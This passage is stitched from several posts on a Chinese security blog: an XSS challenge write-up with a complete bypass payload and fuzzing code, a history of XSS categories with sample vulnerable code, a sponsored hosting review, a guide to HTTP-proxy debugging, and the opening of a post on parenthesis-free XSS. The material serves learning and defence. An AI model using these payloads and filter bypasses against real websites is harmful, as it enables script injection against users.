這個方法其實大家都知道，但我自己可以檢討的方向就是當時太懶…我一直預設說這一題就是要 reverse wasm，所以就連試都沒去試，預設立場然後立場又不對，就卡死了。 之後可以積極嘗試不同方法，不要被困在既有的想法裡面。 再來他簡單掃了一下 wasm，發現沒什麼隱藏的東西，開始問自己說有什麼漏洞是只有 wasm 會有而 JS 沒有的，答案是 buffer overflow。 接著他就開始去試，發現密碼長度很長的時候，payload 會反映出原本的密碼。解到這邊之後他確定這一段可行，開始看其他部分。 regexp 繞過那邊，他直接根據經驗給出了可以繞過的字元 &#x2F;u2028 跟 &#x2F;u2029 這邊其實有下對關鍵字也查得到：Line terminators，我當初犯的錯誤是太早放棄，一直想說：「我知道可能有其它字元也可以換行，但我不知道是什麼啊」，阿是不會去 google 逆啦 這邊繞過之後開始繞過最後的限制，也就是一大堆限制字元的那邊。這邊的手法很炫，那就是 - 並沒有被限制，所以可以使用很多次的 unsafeCharacters.length-- 去把陣列縮短，這樣限制字元就變少了！ 不過這樣的話，就變成要觸發整個流程兩次，第一次把限制字元縮短，第二次才能把真正的 payload 放到畫面上。可是一旦 alert 出現之後，按下關閉就會重整網頁，沒辦法觸發兩次。 最後給出的解法是：document.body.lastElementChild.outerHTML--，把剛剛新增進去的 alert 整個破壞掉變成 NaN，就不會重整了。 完整程式碼： 1000\\u2029&lt;script&gt;unsafeCharacters.length--;unsafeCharacters.length--;unsafeCharacters.length--;unsafeCharacters.length--;unsafeCharacters.length--;unsafeCharacters.length--;unsafeCharacters.length--;document.body.lastElementChild.outerHTML--;&lt;&#x2F;script&gt;&lt;script&gt;alert()&lt;&#x2F;script&gt; 需要點擊 generate 兩次才能觸發。 最後總結一下學到的東西： 分段落去嘗試，遇到不懂的東西就先亂試東西看看，搞不好就壞掉找出問題了 不要預設立場，解法可能跟你想的方向完全不同 google 很好用 如果沒辦法繞過限制，就把限制破壞掉 FHantke連結：Intigriti — XSS Challenge 0621 關於 regexp 的繞過，他直接寫了段簡單的程式 fuzzing 一下： for (i=0;i&lt;10000; i++) &#123; let passwordLength = document.getElementById(\"password-length\"); passwordLength.value = \"2\" + String.fromCharCode(i) + \"4\"; var p = passwordLength.value.match(/^\\d+$/gm); if (p) console.log(i + \" => \" + p); &#125; 對欸，為什麼我沒有想到可以這樣找，寫一段 code 幫你去猜怎樣可以繞過就好，這招很棒一定要學起來。 接著他一樣去試說怎樣的 payload 可以把 wasm 弄爆，發現 passwordLength 傳很大的，然後 allowedNumbers 傳個字串，就會反映在產生的密碼上面。 最後他用的技巧是：&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;，雖然說一樣會變成：&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;，但因為是包在 svg 裡面，所以會用 svg 的 parser 來解析，解析的規則不同，原文裡有附上 DOM 的圖。 這招也好棒，我記得好像以前有在哪邊看過。 不過最後的 payload 只在 Firefox 上面有用而已，不太確定為什麼，原文也沒寫到，我暫時也懶得查XD 話說寫完之後才發現這篇 writeup: Intigriti’s 0621 XSS challenge - by Physuru (@cffaedfe)，裡面一樣用了很多 fuzzing 來找出合法的 payload，這篇也滿值得參考的。 總結學到幾招很好用的： 用 &lt;svg&gt;&lt;script&gt;&lt;/script&gt;&lt;/svg&gt; 繞過一些字元被 encode 的限制 用 arr.length-- 破壞陣列 用 fuzzing 去找出合法的字元是什麼，簡單暴力又有效 有些東西不要先深入去看實作，先去試 payload，傳入不同組合跟極端的參數看看","link":"/2021/07/03/xss-challenge-intigriti-june-review/"},{"title":"XSS 從頭談起：歷史與由來","text":"我以前有寫過一些關於 XSS 的文章，主要在談的是實作面的防範以及防禦的各個細節： 防止 XSS 可能比想像中困難 淺談 XSS 攻擊與防禦的各個環節 這篇原本想寫的是 XSS 的基礎，就大家都聽過的那三種類別：Stored(Persistent)、Reflected(Non-Persistent) 以及 DOM-based XSS，但當我正要開始寫的時候，腦中突然浮現了幾個問題：「XSS 是什麼時候出現的？這三種類別又是什麼時候開始被分類的？」 因此，我花了點時間找了一些資料，這篇文章會跟大家談談 XSS 的歷史，讓我們一起更了解 XSS 的前世今生。 XSS 的誕生從微軟的 MSDN blog 在 2009 年 12 月發佈的文章標題：Happy 10th birthday Cross-Site Scripting! 中就可以看出 XSS（Cross-Site Scripting）這個名詞約莫是 1999 年 12 月誕生的，離現在已經 20 幾年了。 （下圖為上面連結的截圖） 原文最後有這麼一段話： Let’s hope that ten years from now we’ll be celebrating the death, not the birth, of Cross-Site Scripting! 很遺憾的，2009 年的 10 年後，也就是 2019 年，XSS 依舊持續活躍著，在 2017 年的 OWASP top 10 排在第七名，2021 的版本則併入第三名 Injection 的類別。 而文中提到的：CERT® Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests，可以讓我們一窺最早期 XSS 的面貌。底下就讓我們簡單看一下這個網頁的內容： A web site may inadvertently include malicious HTML tags or script in a dynamically generated page based on unvalidated input from untrustworthy sources. This can be a problem when a web server does not adequately ensure that generated pages are properly encoded to prevent unintended execution of scripts, and when input is not validated to prevent malicious HTML from being presented to the user. 在 Overview 的部分其實就把 XSS 的核心概念講得非常清楚了，server 沒有驗證輸入或是編碼，導致攻擊者可以插入一些惡意的 HTML 標籤或是 script。 Malicious code provided by one client for another client Sites that host discussion groups with web interfaces have long guarded against a vulnerability where one client embeds malicious HTML tags in a message intended for another client. For example, an attacker might post a message like Hello message board. This is a message.&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;This is the end of my message. When a victim with scripts enabled in their browser reads this message, the malicious code may be executed unexpectedly. Scripting tags that can be embedded in this way include &lt;SCRIPT&gt; &lt;OBJECT&gt;, &lt;APPLET&gt;, and &lt;EMBED&gt;. When client-to-client communications are mediated by a server, site developers explicitly recognize that data input is untrustworthy when it is presented to other users. Most discussion group servers either will not accept such input or will encode&#x2F;filter it before sending anything to other readers. 這一段則是後來被稱為「Stored XSS（也稱為 Persistent XSS）」的分類，假設有一個討論區可以讓人留言，一個惡意的攻擊者可以留這樣的內容： Hello message board. This is a message. &lt;SCRIPT>malicious code&lt;/SCRIPT> This is the end of my message. 當其他使用者看到這篇留言的時候，因為留言裡面有 &lt;script&gt; ，所以就會執行攻擊者所留下的 JavaScript 程式碼。 除了這個以外，&lt;object&gt;、&lt;applet&gt; 跟 &lt;embed&gt; 也都可以用來執行 JavaScript（話說 applet 這標籤應該已經沒用了，可參考：Don’t break the Web：以 SmooshGate 以及 keygen 為例 ）。 Malicious code sent inadvertently by a client for itself Many Internet web sites overlook the possibility that a client may send malicious data intended to be used only by itself. This is an easy mistake to make. After all, why would a user enter malicious code that only the user will see? However, this situation may occur when the client relies on an untrustworthy source of information when submitting a request. For example, an attacker may construct a malicious link such as &lt;A HREF=&quot;http://example.com/comment.cgi? mycomment=&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;&quot;&gt; Click here&lt;/A&gt; When an unsuspecting user clicks on this link, the URL sent to example.co includes the malicious code. If the web server sends a page back to the user including the value of mycomment, the malicious code may be executed unexpectedly on the client. This example also applies to untrusted links followed in email or newsgroup messages. 這一段就很有趣了，標題是：「Malicious code sent inadvertently by a client for itself」，發送的內容基本上只有自己能看到。 例如說網址中 mycomment 這個參數會反映到畫面上，所以像是 http://example.com/comment.cgi?mycomment=123，畫面上面就會出現 123。 但只有自己能看到能做什麼呢？ 因為是透過網址上的 query string 來傳遞資訊，因此可以產生這樣的一個連結：http://example.com/comment.cgi?mycomment=&lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;，接著再把這個連結傳給其他人，當其他人點了以後，畫面上就會出現 &lt;SCRIPT&gt;malicious code&lt;/SCRIPT&gt;，照樣達成 XSS。 這就是 XSS 的另外一種分類：Reflected XSS，你的輸入會反映在畫面上。 而這兩種的差別在於 Stored XSS 就像它的名字一樣，XSS payload 是被保存住的，以討論區來說，文章是保存在資料庫中的，而 Reflected XSS 則不然。 以 PHP 為例，Reflected XSS 的程式碼可能會像這樣： &lt;?php $comment = $_GET['comment']; ?> &lt;div> &lt;?= $comment ?> &lt;/div> 把 GET 的參數直接反映在畫面上，所以每一次都必須透過 comment 這個參數把 payload 傳進去，否則不會觸發 XSS。 以上面提的「討論區」這個網站為例，Stored XSS 的破壞力應該是更強大的，因為只要點進去你這篇文章就會中招，可以想成你在 ptt 發了一篇文章，只要有鄉民點進來文章就會被攻擊，還滿容易觸發的。 但 Reflected XSS 就不太一樣了，這需要使用者點擊連結才會出事，像是你在 ptt 推文留了一個連結，鄉民要主動點那個連結才能觸發 XSS。 文中的其他部分也很有趣，例如說也有提到僅管把 JavaScript disabled，依然可以用 HTML 與 CSS 去竄改畫面等等，也有提到修補方式，在這邊：Understanding Malicious Content Mitigation for Web Developers 修補方式除了我們熟悉的針對內容編碼以外，還有另一個是要「指定編碼方式」，這邊的編碼指的是 UTF-8 或是 ISO-8859-1 以及 big5 這種編碼。雖然說現在這個年代絕大部分網站都是 UTF-8 了，但早期其實不然。在以往瀏覽器還支援像是 UTF-7 這樣的編碼方式，就算不用一些特殊字元也可以達成 XSS： &lt;html> &lt;head>&lt;title>test page&lt;/title>&lt;/head> &lt;body> +ADw-script+AD4-alert(1)+ADw-/script+AD4- &lt;/body> &lt;/html> 範例取自：XSS 和字符集的那些事兒，裡面有提到更多這種類似的問題，但大多數問題應該都發生在比較早期的瀏覽器上面。 第三種 XSS 分類的誕生有看過 XSS 文章的人都知道，最廣為人知的 XSS 分類大概就三種： Stored XSS（Persistent XSS） Reflected XSS（Non-Persistent XSS） DOM-based XSS 再繼續往下之前，我先來問問看大家兩個問題。 第一個問題，假設現在我發了一篇文章，內容為 &lt;img src=x onerror=alert(1)&gt;，而顯示文章的頁面程式碼是這樣的： &lt;script> getPost(&#123; id: 1&#125;).then(post => &#123; document.querySelector('.article').innerHTML = post.content &#125;) &lt;/script> 因為用了 innerHTML 的緣故，所以就有了一個 XSS 漏洞，在這個狀況之下，我的留言確實有「保存」在資料庫，但也同時用了 DOM 去改變內容，那這個 XSS 應該被歸類在 Stored XSS，還是 DOM-based XSS？ 第二個問題，假設網頁中有一段程式碼長這樣： &lt;script> document.querySelector(\".search\").innerHTML = decodeURIComponent(location.search) &lt;/script> 這顯然可以透過 query string 製造出一個 XSS 漏洞，這個 XSS 確實反映了使用者的輸入，而且沒有被儲存在資料庫裡面，不過卻是用 DOM 去改變內容，那它應該是 Reflected XSS，還是 DOM-based XSS？ 在繼續往下閱讀之前，大家可以先想一下上面這兩個問題。 先來講講我以前的答案，我之前是用下面的定義來分類這幾個的： 我的 XSS payload（例如說 &lt;script&gt;alert(1)&lt;/script&gt;）如果有存在資料庫，那就是 Stored XSS 如果不是，那就看我的 payload 是直接從後端輸出，還是透過 DOM 去賦值，前者就是 Reflected，後者就是 DOM-based 後來我才發現這個分類方式是錯誤的，因為我被「stored」這個名詞誤導了，沒有意識到這背後的歷史背景。 這是什麼意思呢？在 1999 年 XSS 剛出來的時候，Ajax 還不存在（它是 2005 年才誕生的），所以前後端的資料交換應該都是透過表單送去 Server，並且直接把回應 render 出來。 換句話說，在 1999 年的時候，基本上沒有什麼操作是用 JavaScript 去更改畫面內容的，就算有，也是一些比較無關緊要的操作。但在 2021 年都不一樣了，在這個 SPA 盛行的年代，基本上都是透過 JavaScript 去呼叫 API，拿到資料以後再去更改畫面，後端只負責提供資料，前端靠著 JavaScript 來 render，這跟 20 年前完全不同。 XSS 的三種分類之中，前兩種 Stored 以及 Reflected 在 XSS 誕生之時就已經存在了，而第三種則晚了五年才出現（這邊的「出現」指的是有個名詞或分類來定義它，而不是指攻擊出現），出處應該是這一篇：DOM Based Cross Site Scripting or XSS of the Third Kind 文中的 Introduction 有這樣一個段落： XSS is typically categorized into “non-persistent” and “persistent” (“reflected” and “stored” accordingly, as defined in [4]). “Non-persistent” means that the malicious (Javascript) payload is echoed by the server in an immediate response to an HTTP request from the victim. “Persistent” means that the payload is stored by the system, and may later be embedded by the vulnerable system in an HTML page provided to a victim. 重點是 Stored 跟 Reflected 這兩個分類都有一個前提：「payload 是由後端直接 render 的」，而這篇文章所提到的第三個分類 DOM-based，指的則是「payload 是由前端 render 出來的」，這就是第三種與前兩種的最大差異。 在判別 XSS 的時候，應該先確認的其實是「payload 是前端還是後端 render？」，如果是前端 render 出來，不論資料從哪裡來（從資料庫或是網址或任何地方都可以），就是 DOM-based XSS。如果是後端 render 出來，才去區分是 Stored 還是 Reflected。 因此，剛剛那兩個問題因為都是前端 render 的關係，都會被歸類在 DOM-based XSS。 上面的文章中就有舉一個類似的例子： &lt;HTML> &lt;TITLE>Welcome!&lt;/TITLE> Hi &lt;SCRIPT> var pos=document.URL.indexOf(\"name=\")+5; document.write(document.URL.substring(pos,document.URL.length)); &lt;/SCRIPT> &lt;BR> Welcome to our system … &lt;/HTML> 在文章的註解中還特別提到了： The malicious payload was not embedded in the raw HTML page at any time (unlike the other flavors of XSS). 因為 payload 其實不存在於任何 HTML page（因為是後來才用 JavaScript 改變的），所以它不屬於 Stored 也不屬於 Reflected，是第三種新的類型的 XSS。 至於修補方式的話，由於是在前端用 JavaScript render，所以編碼的工作當然就是前端的開發者要負責，一個常見的方式是這樣（程式碼取自：Sanitizing user input before adding it to the DOM in Javascript）： function sanitize(string) &#123; const map = &#123; '&amp;': '&amp;amp;', '&lt;': '&amp;lt;', '>': '&amp;gt;', '\"': '&amp;quot;', \"'\": '&amp;#x27;', \"/\": '&amp;#x2F;', &#125;; const reg = /[&amp;&lt;>\"'/]/ig; return string.replace(reg, (match)=>(map[match])); &#125; 但有一點要特別注意，那就是並不是這樣就萬事👌👌了，XSS 的防禦比較麻煩的點是要針對不同情境做處理，如同 OWASP: Cross Site Scripting Prevention Cheat Sheet 中有提到的，如果你的輸出是要放到 &lt;a href=&quot;&quot;&gt; 裡面的話，需要考慮到 javascript:alert(1) 這種形式的 payload，這時候上面的 sanitize function 就沒有用了。 結語其實一開始會發現分錯，是因為在 HITCON ZeroDay 平台上所回報的漏洞分類被改變，才讓我意識到自己對於這幾種的分法理解錯誤，在這邊也感謝負責審查的工作人員。 除了這幾種分法以外，其實也有其他種的分類方式，例如說使用者需要自己輸入 XSS payload 的 Self XSS，或者是利用 HTML 解析不一致而達成的 Mutation XSS 等等，其實都是 XSS 很有趣的應用，以後有機會再來跟大家分享。","link":"/2021/10/11/xss-history/"},{"title":"快速部署網站的新選擇：Zeabur 使用心得","text":"以前當我想要部署一個簡單的服務時，我會去 Heroku 上面，因為簡單而且免費，雖然說還是有些使用限制，但整體而言還是很方便的，甚至還有一些簡單的 DB 可以用。如果是靜態網頁，會選擇 Netlify 或是 GitHub Pages，也都是簡單方便的選擇。 但 Heroku 從 2022 年年底之後就不再提供免費方案了，因此那時一堆人在尋找替代方案，包括 Render 或是 fly[dot]io 等等，都是很多人跳槽的新選擇。而我自己以前其實在 Heroku 上也有三四個專案，從 Heroku 改變方案之後就再也沒也動過了。 前陣子收到 Zeabur 創辦人的來信，希望有機會能跟我合作推廣這個平台，我自己試了之後發現體驗確實很不錯，因此就寫了這篇文章介紹一下。 Zeabur 初體驗Zeabur 是一個能夠幫你快速部署網站的服務，而且標榜的是簡單快速，幾乎不用額外多設定一些什麼，就能夠部署成功。 其實我之前已經聽過 Zeabur 一段時間了，但一直以來都沒機會使用，這次想說既然要合作，那我就拿之前放在 Heroku 卻死掉的專案來用好了。 在 Zeabur 後台新增一個 app 時，可以選擇用什麼方式部署： 我選了最方便的 GitHub，接下來就提供授權讓它可以訪問你的倉庫，就完成了。 對，是真的完成了。 選好 repo 的名稱按下去以後，就會自動開始 build 然後部署，大概過個一兩分鐘就會看到 running，已經跑起來了： 跑起來之後記得去底下的「網路」那邊設定一個公開域名，才能訪問得到： 我試了兩個以前放在 Heroku 的專案，一個是用 Node.js 寫的，另一個是用純 PHP（沒有任何框架），兩個專案都是點一下之後就自動跑後續流程，然後就完成了。 老實說這個體驗是真的滿令人驚豔的，真・一鍵部署，以前在用 heroku 的時候我記得創完 app 還要先下載什麼 heroku-cli，然後跑個指令再把程式碼推上去才會開始部署，相較之下 Zeabur 的體驗好很多（或許 Heroku 後來也有類似機制，但我還沒用到它就改方案了）。 而這個順暢的使用者體驗也是我會答應接下這個合作的主因。 收費方式Zeabur 的計費方式滿複雜的，細節在這個頁面：https://zeabur.com/zh-TW/pricing 先從免費版開始講，免費版的話只支援靜態網站（像是 GitHub Pages 那種）以及 serverless function（像是 AWS lambda 那種），靜態網站的部分我覺得沒有很吸引人，因為老實說 GitHub Pages 會是我更推薦的選擇，但 serverless 的部分倒是滿不錯的。 舉例來說，我有一個 Node.js 的 app 其實也沒幹嘛，就是一個簡單的 server 而且沒有 DB，這時候就很適合改成 serverless 的架構，就適用於免費版，可以一直當個免費仔。 但如果 serverless 沒辦法滿足你，就需要切成付費版，基本上每個月最少是 5 塊美金。他們的付費版會根據你用多少記憶體、CPU、儲存空間以及流量來收錢，無論有沒有用滿，最少就是 5 塊美金，而多的就再往上加。 那 5 塊錢美金大概是多少資源呢？ 如果不算流量跟空間（這兩個相對便宜，如果正常使用的話）的話，每個月 512 MB 的記憶體是 2 塊美金，0.25 vCPU 是 3 塊美金，差不多就是這兩個加起來。 順帶一提，Zeabur 非常支持開源專案，所以如果你是開源專案的 maintainer 的話，可以聯繫 Zeabur，開源專案本身就能獲得免費使用，而其他專案的 contributor 也能拿到 coupon。 Zeabur 的優點與缺點對我來說 Zeabur 最大的優點是部署方便快速，許多專案點一下就可以部署了，不需要額外再寫什麼設定檔（不過我也只試過簡單的，沒試過更複雜的，所以不敢保證）。 再來的話滿多人喜歡他們的中文客服，畢竟這種 PaaS 大部分都是國外的，中文客服實屬難能可貴。 最後的話如果有很多小專案我覺得滿適合放上面的，因為計費是按照使用量來計算，例如說我有 5 個小專案，每個平均固定吃 100 MB 記憶體，CPU 使用也不大，那可能全部加起來就是月費五塊美金，滿划算的。 再來講講缺點。 最令人擔憂的點大概就是服務的持續性，畢竟新創公司的陣亡率大家都是知道的，有可能哪天營收不佳就整個收掉了，到時候要遷移專案也是挺麻煩的。 接著的話是穩定性，畢竟是規模比較小的公司，使用者也還沒有這麼多，不確定當使用者變多的時候，機器是不是能即時扛住，這點還需要時間來考驗。 適合使用 Zeabur 的人如果你有個短期的專案需要找地方部署，又懶得自己去管那些機器以及設置環境，那我覺得 Zeabur 是個可以考慮的地方，畢竟方便而且價格又不貴。 這個短期專案可以是活動網站，也可以是面試的時候要拿來 demo 的專案等等。 或是你常常有很多小專案，沒有吃這麼多資源，也可以考慮 Zeabur，剛剛我也提過計費方式了，可以自己算一下是不是會比較划算。如果服務多而且吃的資源也比較多，去買每個月 5 塊、10 塊美金的 VPS 可能會是更划算的選擇（但要多花時間設置環境就是了）。 除此之外，Zeabur 也有提供很多寫好的模板，能夠幫你快速一鍵部署服務，例如說 WordPress，若是想要自己架一個的話，也可以考慮看看。 結語以上就是對於 Zeabur 的介紹，雖然有提到說免費方案只能部署靜態網站以及 serverless，但其實不全然正確，因為目前免費方案也可以部署一般的那種容器化服務（一整個 server），只是會跳一個提示說隨時有可能被砍掉（畢竟沒付錢，而且是連信用卡都沒綁）。 因此，如果對 Zeabur 的服務有興趣，其實可以先註冊一個帳號去玩玩看，把自己服務放上去試試，如果真的覺得不錯再來付錢，讓服務穩定住在那邊。 這是有我推薦碼的連結，如果你用了之後有付費，我似乎會拿到 5 塊美金的 credit：https://zeabur.com?referralCode=aszx87410 這是沒有我推薦碼的乾淨官方連結：https://zeabur.com 後記之前跟 Zeabur 創辦人聊了一下合作方式，他們一開始提的就是有償的商業合作方案，這點值得鼓勵，我也認同主動找人合作推廣是要付費的。而我自己提出了用 Zeabur 的 credit 來替代現金的方式支付酬勞，他們也欣然同意。 不過我目前沒什麼 service 需要跑，因此這些 credit 我是用不完的，有點浪費，所以就決定把這些 credit 全部回饋給讀者。 如果你有服務想試試看 Zeabur 的付費方案，可以填寫底下這個表單：（活動已結束） 我會從中挑選 15 個人，每個人贈送 4 個月也就是 20 美金的使用額度，希望這些人能夠在使用完 Zeabur 之後寫一篇心得，幫助 Zeabur 變得更好。這個心得不是強制的，就算不寫也可以，而且內容不限，要講優點缺點都可以，非常自由。 表單預計會在 4&#x2F;25 左右關閉，如果有被選中的話，會在四月底的時候透過 email 通知。由於到時候獎勵會經由 email 直接發放，因此需要先註冊 Zeabur 再填寫表單。就如同我上面說的，雖然是免費方案但還是可以部署一般的 server，大家可以先註冊一個帳號玩玩看，覺得好用而且想要把更多東西放在上面，才來填寫表單參加活動。","link":"/2024/04/14/zeabur-introduction-deploy-service/"},{"title":"人人都需要一個 HTTP proxy 來 debug","text":"身為每天都要與網頁打交道的前端工程師，熟悉 DevTools 的使用是相當合理的。每當接 API 出問題時，就按下快捷鍵打開 DevTools，切到 Network 分頁，找到紅色的那一行，右鍵複製成 cURL 貼到群組裡面，讓後端自己找找問題。 但不曉得大家有沒有碰過 DevTools 不夠用的狀況，這時該怎麼辦？ DevTools 真的會不夠用嗎？是不是你不會用？舉幾個我實際碰過的案例，如果 DevTools 能解決那當然是最方便的，但我解決不了（也有可能是我不會用就是了）。另外，底下的 DevTools 指的都是 Chrome DevTools，或許其他瀏覽器的不會有這些問題。 重新導向前的請求細節看不到很多實作 OAuth 相關服務的網站在登入完成後，會跳轉到 redirect url 並且帶著一個 code，而這時有些網站會拿 code 去交換 access_token，然後再帶著 access_token 跳轉到下一個頁面。如果 code 交換 access_token 這一步有問題，該怎麼 debug 呢？ Chrome DevTools 在跳轉到其他頁面時，預設會把 console 跟 network 的東西都清空。有一個選項叫做「Preserve log」，把它勾起來以後看似問題就解決了，但其實沒有。 大家可以隨便找一個網頁，打開 DevTools 並且把保留 log 勾起來，然後執行以下程式碼： fetch('https://httpbin.org/user-agent') .then(() => window.location = 'https://example.com') 當跳轉完成以後，雖然 Network 那邊確實可以看到這個請求，但點進去以後只會看到「Failed to load response data」： 這個問題從 2012 年就有人回報了，好不容易等了十幾年，2023 年底時說這個在 2024 的 roadmap 上，但目前依然沒有任何動靜：DevTools: XHR (and other resources) content not available after navigation.。 總之呢，在這個情境之下，看不到 response 基本上沒辦法 debug，很不方便。 WebSocket 連線握手失敗找不到原因雖然我們平常在用 WebSocket 時，只需要一行程式碼就可以建立連接，但背後其實是分了兩步。 第一步會發出一個 HTTP Upgrade 請求，完成以後才切換到 WebSocket 連線。雖然大多數狀況之下第一步都會成功，那如果第一步失敗會怎樣呢？ 我們可以請 AI 寫一個很簡單的 demo 出來： 寫一個 nodejs websocket server，然後用一個 nginx 擋在前面 nginx 的作用是當 url 含有 ?debug 的時候要回傳 500 錯誤 當 websocket 連線後會往 client 自動發送 hello 的 message 最後要包裝成可以用 docker compose 跑起來 等 AI 產完之後用 docker 跑起來，一樣隨便開個網頁建立連接，會發現帶有 debug 的那個連線請求，你只知道失敗了，卻完全不知道原因： 這個錯誤訊息甚至跟你隨便連一個沒開的 port 一樣，完全不知道為什麼會失敗，這樣也很難跟後端說問題在哪裡。 以上是兩個我有印象的範例，但實際開發中應該碰過更多更多，基本上都是只靠 DevTools 來看 Network 沒辦法解決的問題，要嘛是看不到，要嘛看到的東西不太對。 簡單好用的 HTTP Proxy既然沒辦法靠 DevTools，那只能依賴更底層的工具了，例如說 HTTP Proxy！有些工具會在你本機起一個 proxy，這樣流量就會都經過它，自然而然就能看到所有的請求了，就不必再受限於 DevTools。 而且另一個好處是有地方可以互相對照，如果 proxy 顯示的跟 DevTools 顯示的不同，就有可能是 DevTools 顯示的東西有問題。 因此，誠心推薦大家找個 HTTP Proxy 來用，我自己用過的有這三個： Charles Burp Suite mitmproxy 以前我剛接觸 proxy 時用的是 Charles，接觸到資安以後就改成用第二個 Burp Suite 了。它其實是個可以拿來做各種資安相關測試的工具，但我覺得你只拿來做 proxy 也沒問題，非常方便。 第三個 mitmproxy 是開源且免費的，知名度也很高，我偶爾也會用但是用的方式不太一樣，這個晚點再講。 把 Burp Suite 當 Proxy App 來用先到官網下載個免費的社群版：https://portswigger.net/burp/communitydownload 打開之後按下 Next 然後 Start Burp，就會看到主畫面。你會發現它的功能很多，但我們先切到「Proxy」頁籤底下「HTTP history」這一頁就行了： 然後那顆很顯眼橘色的「Open Browser」點下去，就會開啟它自帶的 Chrome 瀏覽器，可以用這個瀏覽器訪問任何一個網頁，例如說 example.com。 接著切回工具，就會發現 HTTP history 裡面記錄著所有請求的原始內容跟 response： 如此一來，前面提過的跳轉案例跟 WebSocket 握手失敗，都可以在這邊看到原始請求內容，錯誤一目瞭然： 如果未來你碰到有些請求看不到，那就是被預設的 filter 篩選掉了，點 Filter settings 那邊選 show all 後 apply，應該就能看到了。 （若是有碰到不安全的連線等問題，需要先安裝憑證，請參考：Installing Burp’s CA certificate） 以上就是 Burp Suite 做為 HTTP Proxy 的基本介紹。如果你不想用它提供的 Chrome，也可以自己設置電腦或是瀏覽器的 proxy，它預設會在 8080 port。 舉例來說，我在 Mac 上會再裝一個 Chrome Canary 專門拿來 debug，用這個指令可以開啟並且設定好 proxy 位置： open -a \"Google Chrome Canary\" --args --proxy-server=\"http://localhost:8080\" 如此一來就能用自己熟悉的瀏覽器 debug 了。 話說 Burp Suite 還有很多其他功能啦，例如說重放請求或是暴力破解等等，不過我覺得一般工程師把它當 proxy 來用就已經幫助很大了。對完整功能有興趣的話可以參考 HackerCat 所寫的 Web滲透測試 – Burp Suite 完整教學系列。 用 mitmproxy 搭配腳本動態改變內容mitmproxy 的安裝過程我就不多說了，可以參考官方文件或是跟 AI 協作自己裝起來，安裝完之後也記得訪問一下 http://mitm.it 下載並安裝憑證，才能攔截到 HTTPS 的流量。 都安裝完以後，執行 mitmproxy 就能夠把 proxy 跑起來了，會看到一個 CLI 的介面。 那既然 Burp Suite 已經很好用了，什麼時候會用到 mitmproxy 呢？它有個好用的功能是可以透過簡單的 Python 腳本去客製化 proxy 的行為，非常方便。 舉例來說，假設因為某些原因，測試環境無法完全模擬正式環境，但你又不可能直接把 code 上到正式環境去測試。這時就可以用 proxy 動態替換 production 的 response，在本機模擬一些行為。 雖然 Chrome 也有覆蓋 response 的功能，但限制比較多，例如說內容只能固定等等。我們自己用 proxy 搭配腳本，絕對是更彈性而且自由度更高的選擇。 底下是一個簡單的 mitm 腳本，目的是把我部落格的 script.js 用本機的來替換： from mitmproxy import http import requests URL_MAPPINGS = &#123; \"https://blog.huli.tw/js/script.js\": \"http://localhost:5555/script.js\", &#125; def request(flow: http.HTTPFlow) -> None: for url in URL_MAPPINGS: if flow.request.pretty_url.startswith(url): replacement_url = URL_MAPPINGS[url] replacement_response = requests.get(replacement_url) flow.response = http.Response.make( 200, replacement_response.content, &#123;\"Content-Type\": \"application/javascript\"&#125; ) return 用這個指令就可以跑起來： mitmproxy -s proxy.py 接著用前面講過的指令打開一個設定好 proxy 的瀏覽器： open -a \"Google Chrome Canary\" --args --proxy-server=\"http://localhost:8080\" 再用瀏覽器訪問 https://blog.huli.tw，就能夠看出 script 的內容已經被替換。 結語以上就是我平常自己會使用到的一些 proxy 以及使用方法。 太過依賴於瀏覽器不是件好事，只要瀏覽器沒有顯示，就不知道該怎麼辦。但前端工程師身為第一線，絕對是有辦法拿到整個 request 與 response，才能進一步釐清問題。以後若是碰到瀏覽器上看不到請求的問題，可以試試看使用 proxy 來拿到完整的請求以及響應。 除了電腦的網頁之外，手機也可以用，可以在 Android 上設定 proxy 連到同個 Wi-Fi 的電腦上，接著在手機上安裝憑證，就能攔截手機的流量。 最後再講一個小訣竅，在 Mac 的 CLI 執行指令時加上 https_proxy=http://localhost:8080 就能夠配置 proxy，如 https_proxy=http://localhost:8080 cursor .，就可以把 Cursor IDE 的流量都導到 proxy 去。","link":"/2025/04/23/everyone-need-a-http-proxy-to-debug/"},{"title":"不需要括號跟分號的 XSS","text":"前陣子收到一封讀者來信，問我能不能寫一篇來講解 XSS without parentheses and semi-colons 這篇文章，說是這裡面的 payload 看不太懂。 因此，這篇就來簡單講解一下這些 payload，參考的原文是 Gareth Heyes 的這兩篇文章： XSS technique without parentheses XSS without parentheses and semi-colons 為什麼我們需要這種 payload？有些人會想說既然都可以執行 JavaScript 了，幹嘛還要這麼多限制？而最大的原因是：WAF（Web Application Firewall），最常見的就是 Cloudflare 的 WAF，只要有一點風吹草動就把你擋下來，儘管你可以插入 HTML 或甚至執行 JavaScript，但只要含有某些 pattern 就直接把你擋掉。 再者，有些情境會造成部分字元不可用，這時候就需要發揮創意，想辦法不用這些字元來湊出可以執行的程式碼。 先從不需要括號開始在 JavaScript 中似乎要執行函式就一定要括號，那如果不能用括號該怎麼辦呢？ Tagged template strings第一種方法有些開發者應該用過，但可能一時不會想到。某些 JavaScript 的 library 會用 template strings 來執行函式，如 Postgres.js： async function getUsersOver(age) &#123; const users = await sql` select name, age from users where age > $&#123; age &#125; ` // users = Result [&#123; name: \"Walter\", age: 80 &#125;, &#123; name: 'Murray', age: 68 &#125;, ...] return users &#125; 不懂的人乍看之下會想說怎麼這樣寫，難道不是個 SQL injection 漏洞嗎？ 如果只用了 template strings 的話，那確實是，但注意前面多了個 sql，這就不一樣了，就不只是單純的字串拼接，而是函式執行了，是一個 JavaScript 的語法，可以看底下範例： function test(...args)&#123; console.log(args) &#125; test`Hello $&#123;'huli'&#125;!!!$&#123;'good'&#125;~~` // [['Hello ', '!!!', '~~'], 'huli', 'good'] 當我們在前面加上一個函式時，函式的參數會收到原始字串中固定的部分，以及被插入的變數，就可以直接用這些資訊做 sanitization，來避免 SQL injection，這種用法叫做 tagged templates strings。 最後達成的效果就是看起來只是字串取代，但背後是函式執行而且有做 sanitization，所以其實是安全的。 利用這個概念，就可以寫出不需要括號的 XSS payload： alert`test` 